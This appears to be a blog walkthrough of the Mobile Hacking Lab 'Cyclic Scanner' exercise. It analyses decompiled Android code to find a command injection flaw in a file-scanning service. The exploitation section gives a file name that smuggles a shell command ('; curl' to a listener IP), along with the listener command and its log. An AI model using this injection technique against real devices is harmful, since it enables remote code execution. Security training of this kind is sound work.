---
layout: post
title: Cyclic Scanner - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Cyclic Scanner](https://www.mobilehackinglab.com/course/lab-cyclic-scanner) lab offers a fascinating look into Android vulnerabilities, particularly focusing on exploiting a code execution flaw within an Android service employing a vulnerable handler. <!--more--> Let's go step by step into understanding what the application conceals beneath the surface to exploit this vulnerability.

### Introduction 

Upon opening the application, users are prompted to grant permissions to manage and view all system files. Once permission is granted, the application appears straightforward, featuring only a switch to activate the scanner, accompanied by a message indicating that the service has been initiated.

### Static Analysis

Firstly, let's inspect the AndroidManifest.xml file:

```xml
<!-- AndroidManifest.xml -->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.mobilehackinglab.cyclicscanner" platformBuildVersionCode="34" platformBuildVersionName="14">
    <uses-sdk android:minSdkVersion="30" android:targetSdkVersion="33"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <permission android:name="com.mobilehackinglab.cyclicscanner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
    <uses-permission android:name="com.mobilehackinglab.cyclicscanner.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application android:theme="@style/Theme.CyclicScanner" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules">
        <activity android:name="com.mobilehackinglab.cyclicscanner.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService" android:exported="false"/>
        <provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.mobilehackinglab.cyclicscanner.androidx-startup">
            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.profileinstaller.ProfileInstallerInitializer" android:value="androidx.startup"/>
        </provider>
        <receiver android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP" android:enabled="true" android:exported="true" android:directBootAware="false">
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

The manifest reveals crucial insights. The app requests permissions to create a foreground service, defines a service called `ScanService`, and ensures it is not exported. Additionally, it designates `MainActivity` as exported.

`MainActivity` code:

```java
// MainActivity.java
package com.mobilehackinglab.cyclicscanner;

import android.content.DialogInterface;
...

public final class MainActivity extends AppCompatActivity {
    private ActivityMainBinding binding;
    private ActivityResultLauncher<Intent> requestPermissionLauncher;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding activityMainBinding = null;
        EdgeToEdge.enable$default(this, null, null, 3, null);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding2 = null;
        }
        setContentView(activityMainBinding2.getRoot());
        ActivityMainBinding activityMainBinding3 = this.binding;
        if (activityMainBinding3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding3;
        }
        ViewCompat.setOnApplyWindowInsetsListener(activityMainBinding.main, new OnApplyWindowInsetsListener() { // from class: com.mobilehackinglab.cyclicscanner.MainActivity$$ExternalSyntheticLambda0
            @Override // androidx.core.view.OnApplyWindowInsetsListener
            public final WindowInsetsCompat onApplyWindowInsets(View view, WindowInsetsCompat windowInsetsCompat) {
                WindowInsetsCompat onCreate$lambda$0;
                onCreate$lambda$0 = MainActivity.onCreate$lambda$0(view, windowInsetsCompat);
                return onCreate$lambda$0;
            }
        });
        setupPermissionLauncher();
        handlePermissions();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final WindowInsetsCompat onCreate$lambda$0(View v, WindowInsetsCompat insets) {
        Intrinsics.checkNotNullParameter(v, "v");
        Intrinsics.checkNotNullParameter(insets, "insets");
        Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
        Intrinsics.checkNotNullExpressionValue(systemBars, "getInsets(...)");
        v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
        return insets;
    }

    private final void setupPermissionLauncher() {
        ActivityResultLauncher<Intent> registerForActivityResult = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), new ActivityResultCallback() { // from class: com.mobilehackinglab.cyclicscanner.MainActivity$$ExternalSyntheticLambda2
            @Override // androidx.activity.result.ActivityResultCallback
            public final void onActivityResult(Object obj) {
                MainActivity.setupPermissionLauncher$lambda$1(MainActivity.this, (ActivityResult) obj);
            }
        });
        Intrinsics.checkNotNullExpressionValue(registerForActivityResult, "registerForActivityResult(...)");
        this.requestPermissionLauncher = registerForActivityResult;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setupPermissionLauncher$lambda$1(MainActivity this$0, ActivityResult it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (Environment.isExternalStorageManager()) {
            this$0.setupSwitch();
        } else {
            this$0.showPermissionDeniedPopup();
        }
    }

    private final void handlePermissions() {
        if (Environment.isExternalStorageManager()) {
            setupSwitch();
            return;
        }
        Intent intent = new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
        ActivityResultLauncher<Intent> activityResultLauncher = this.requestPermissionLauncher;
        if (activityResultLauncher == null) {
            Intrinsics.throwUninitializedPropertyAccessException("requestPermissionLauncher");
            activityResultLauncher = null;
        }
        activityResultLauncher.launch(intent);
    }

    private final void showPermissionDeniedPopup() {
        new AlertDialog.Builder(this).setTitle("Permission Denied").setMessage("This app requires access to manage all files. Please enable this permission in settings to continue.").setPositiveButton("Exit", new DialogInterface.OnClickListener() { // from class: com.mobilehackinglab.cyclicscanner.MainActivity$$ExternalSyntheticLambda3
            @Override // android.content.DialogInterface.OnClickListener
            public final void onClick(DialogInterface dialogInterface, int i) {
                MainActivity.showPermissionDeniedPopup$lambda$2(MainActivity.this, dialogInterface, i);
            }
        }).setCancelable(false).show();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void showPermissionDeniedPopup$lambda$2(MainActivity this$0, DialogInterface dialog, int i) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        dialog.dismiss();
        this$0.finish();
    }

    private final void setupSwitch() {
        ActivityMainBinding activityMainBinding = this.binding;
        if (activityMainBinding == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding = null;
        }
        activityMainBinding.serviceSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.mobilehackinglab.cyclicscanner.MainActivity$$ExternalSyntheticLambda1
            @Override // android.widget.CompoundButton.OnCheckedChangeListener
            public final void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                MainActivity.setupSwitch$lambda$3(MainActivity.this, compoundButton, z);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (isChecked) {
            Toast.makeText(this$0, "Scan service started, your device will be scanned regularly.", 0).show();
            this$0.startForegroundService(new Intent(this$0, ScanService.class));
            return;
        }
        Toast.makeText(this$0, "Scan service cannot be stopped, this is for your own safety!", 0).show();
        ActivityMainBinding activityMainBinding = this$0.binding;
        if (activityMainBinding == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding = null;
        }
        activityMainBinding.serviceSwitch.setChecked(true);
    }

    private final void startService() {
        Toast.makeText(this, "Scan service started", 0).show();
        startForegroundService(new Intent(this, ScanService.class));
    }
}
```

Examining `MainActivity`, we find that the most noteworthy action occurs within the `startService()` function, which is triggered when the switch is activated, initiating the `ScanService`. Now, let's look into the code of the `ScanService`.

```java
// ScanService.java
package com.mobilehackinglab.cyclicscanner.scanner;

import android.app.Notification;
...

public final class ScanService extends Service {
    private static final String CHANNEL_ID = "ForegroundScanServiceChannel";
    private static final String CHANNEL_NAME = "ScanService";
    public static final Companion Companion = new Companion(null);
    private static final long SCAN_INTERVAL = 6000;
    private ServiceHandler serviceHandler;
    private Looper serviceLooper;

    /* compiled from: ScanService.kt */
    @Metadata(m24d1 = {"\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\t\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0007X\u0082T¢\u0006\u0002\n\u0000¨\u0006\b"}, m23d2 = {"Lcom/mobilehackinglab/cyclicscanner/scanner/ScanService$Companion;", "", "()V", "CHANNEL_ID", "", "CHANNEL_NAME", "SCAN_INTERVAL", "", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes4.dex */
    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }
    }

    /* compiled from: ScanService.kt */
    @Metadata(m24d1 = {"\u0000\u001e\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0082\u0004\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003¢\u0006\u0002\u0010\u0004J\u0010\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\bH\u0016¨\u0006\t"}, m23d2 = {"Lcom/mobilehackinglab/cyclicscanner/scanner/ScanService$ServiceHandler;", "Landroid/os/Handler;", "looper", "Landroid/os/Looper;", "(Lcom/mobilehackinglab/cyclicscanner/scanner/ScanService;Landroid/os/Looper;)V", "handleMessage", "", NotificationCompat.CATEGORY_MESSAGE, "Landroid/os/Message;", "app_debug"}, m22k = 1, m21mv = {1, 9, 0}, m19xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes4.dex */
    private final class ServiceHandler extends Handler {
        final /* synthetic */ ScanService this$0;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public ServiceHandler(ScanService this$0, Looper looper) {
            super(looper);
            Intrinsics.checkNotNullParameter(looper, "looper");
            this.this$0 = this$0;
        }

        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            Intrinsics.checkNotNullParameter(msg, "msg");
            try {
                System.out.println((Object) "starting file scan...");
                File externalStorageDirectory = Environment.getExternalStorageDirectory();
                Intrinsics.checkNotNullExpressionValue(externalStorageDirectory, "getExternalStorageDirectory(...)");
                Sequence $this$forEach$iv = FilesKt.walk$default(externalStorageDirectory, null, 1, null);
                for (Object element$iv : $this$forEach$iv) {
                    File file = (File) element$iv;
                    if (file.canRead() && file.isFile()) {
                        System.out.print((Object) (file.getAbsolutePath() + "..."));
                        boolean safe = ScanEngine.Companion.scanFile(file);
                        System.out.println((Object) (safe ? "SAFE" : "INFECTED"));
                    }
                }
                System.out.println((Object) "finished file scan!");
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Message $this$handleMessage_u24lambda_u241 = obtainMessage();
            $this$handleMessage_u24lambda_u241.arg1 = msg.arg1;
            sendMessageDelayed($this$handleMessage_u24lambda_u241, ScanService.SCAN_INTERVAL);
        }
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        HandlerThread $this$onCreate_u24lambda_u240 = new HandlerThread("ServiceStartArguments", 10);
        $this$onCreate_u24lambda_u240.start();
        this.serviceLooper = $this$onCreate_u24lambda_u240.getLooper();
        Looper looper = $this$onCreate_u24lambda_u240.getLooper();
        Intrinsics.checkNotNullExpressionValue(looper, "getLooper(...)");
        this.serviceHandler = new ServiceHandler(this, looper);
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        Message message;
        Intrinsics.checkNotNullParameter(intent, "intent");
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Cyclic Scanner Service").setContentText("Scanner is running...").build();
        Intrinsics.checkNotNullExpressionValue(notification, "build(...)");
        startForeground(1, notification);
        ServiceHandler serviceHandler = this.serviceHandler;
        if (serviceHandler != null && (message = serviceHandler.obtainMessage()) != null) {
            message.arg1 = startId;
            ServiceHandler serviceHandler2 = this.serviceHandler;
            if (serviceHandler2 != null) {
                serviceHandler2.sendMessage(message);
            }
        }
        return 1;
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        Intrinsics.checkNotNullParameter(intent, "intent");
        return null;
    }

    private final void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, 3);
        Object systemService = getSystemService("notification");
        Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.app.NotificationManager");
        NotificationManager notificationManager = (NotificationManager) systemService;
        notificationManager.createNotificationChannel(channel);
    }
}
```

Understanding Android Services: Android services operate independently of the user interface, available in various types. Foreground services are visible and execute noticeable tasks, while background services operate invisibly, managing tasks such as data syncing or periodic updates. Bound services facilitate interaction via an interface.

Exploring the `ScanService` class, we find that within the `onStartCommand` function, the service creates a handler, named `ServiceHandler`. This handler's `handleMessage` function traverses all files within the `Environment.getExternalStorageDirectory()`, performing a file scan utilizing the `scanFile` method within the `ScanEngine` class, determining whether files are safe or infected.

Now, let's analyze the `ScanEngine` class:

```java
// ScanEngine.java
package com.mobilehackinglab.cyclicscanner.scanner;

import android.os.Environment;
...

public final class ScanEngine {
    public static final Companion Companion = new Companion(null);
    private static final HashMap<String, String> KNOWN_MALWARE_SAMPLES = MapsKt.hashMapOf(TuplesKt.m16to("eicar.com", "3395856ce81f2b7382dee72602f798b642f14140"), TuplesKt.m16to("eicar.com.txt", "3395856ce81f2b7382dee72602f798b642f14140"), TuplesKt.m16to("eicar_com.zip", "d27265074c9eac2e2122ed69294dbc4d7cce9141"), TuplesKt.m16to("eicarcom2.zip", "bec1b52d350d721c7e22a6d4bb0a92909893a3ae"));

    public static final class Companion {
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {
            this();
        }

        private Companion() {
        }

        public final boolean scanFile(File file) {
            Intrinsics.checkNotNullParameter(file, "file");
            try {
                String command = "toybox sha1sum " + file.getAbsolutePath();
                Process process = new ProcessBuilder(new String[0]).command("sh", "-c", command).directory(Environment.getExternalStorageDirectory()).redirectErrorStream(true).start();
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                BufferedReader reader = bufferedReader;
                String output = reader.readLine();
                Intrinsics.checkNotNull(output);
                Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);
                Unit unit = Unit.INSTANCE;
                Closeable.closeFinally(bufferedReader, null);
                return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
    }
}
```

Herein lies a critical discovery: within the `scanFile` function, there exists a command injection vulnerability, opening the door to code execution. By manipulating file names during scanning, an attacker could exploit this vulnerability.

### Exploiting the Application

To exploit this vulnerability, simply activate the service by toggling the switch. The service will commence scanning through files. All that's required is to have a file on the device named `tmp.txt; curl 192.168.0.109`, triggering the desired code execution.

Start the server:

```bash
python3 -m http.server 80
```

Now, launch the application, and we'll observe the connection confirming the remote code execution.

```
192.168.0.115 - - [06/Apr/2024 18:32:31] "GET / HTTP/1.1" 200 
```

### Conclusion

This lab underscores the mechanics of Android services and how they can be exploited by attackers to achieve remote code execution. A vulnerable handler within a service can compromise a device. For hands-on experience with these concepts, visit the [MobileHackingLab - Cyclic Scanner](https://www.mobilehackinglab.com/course/lab-cyclic-scanner) lab, where you can embark on a journey to bolster your expertise in mobile security.
